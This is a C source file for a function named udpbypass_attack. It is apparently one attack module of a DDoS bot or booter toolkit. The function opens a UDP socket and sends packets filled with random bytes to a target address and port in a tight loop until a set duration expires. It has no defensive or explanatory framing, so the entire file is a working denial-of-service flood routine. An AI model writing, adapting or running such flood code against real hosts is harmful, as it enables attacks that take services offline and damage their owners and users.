#define _GNU_SOURCE

#include "headers/udpbypass_attack.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>

void* udpbypass_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int bypass_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (bypass_sock < 0) {
        return NULL;
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    size_t packet_size = params->psize > 0 ? (size_t)params->psize : 512;
    if (packet_size > 65507) packet_size = 65507;

    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        close(bypass_sock);
        return NULL;
    }

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        for (size_t i = 0; i < packet_size; i++) {
            packet[i] = rand() & 0xFF;
        }

        ssize_t sent = sendto(bypass_sock, packet, packet_size, MSG_NOSIGNAL,
                            (struct sockaddr*)&dest, sizeof(dest));
        if (sent < 0) break;
    }

    free(packet);
    close(bypass_sock);
    return NULL;
}
